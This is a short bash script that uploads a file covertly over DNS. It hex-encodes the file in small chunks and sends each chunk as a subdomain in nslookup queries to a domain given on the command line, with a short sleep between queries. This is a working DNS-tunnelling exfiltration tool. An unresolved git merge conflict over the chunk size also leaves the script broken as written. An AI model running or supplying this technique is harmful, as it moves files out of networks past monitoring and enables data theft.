#!/bin/bash

<<<<<<< HEAD
chunk=4
=======
chunk=8
>>>>>>> 1be65f35fb7e9891fffc5ac264537e8e4c89fcaf
domain=$2
file=$1

if [ ! -f "$file" ] ; then
	echo "File not found."
	exit 1
fi

if [ "$domain" = "" ] ; then
	echo "Domain not specified."
	exit 1
fi

echo "Uploading $file"
size=$(du -b "$file" | grep -o "^[0-9]\+")
if [ "$size" = "" ] ; then
	echo "Error while checking file size"
	exit 2
fi

skip=0
while [ "$((skip*chunk))" -lt "$size" ] ; do
	q=$(dd if="$file" skip=$skip bs=$chunk count=1 2>/dev/null | xxd -ps -c 200)."$domain"
	#echo "$q"
	nslookup "$q" &
	pid="$!"
	sleep 0.1
	skip=$((skip+1))
done
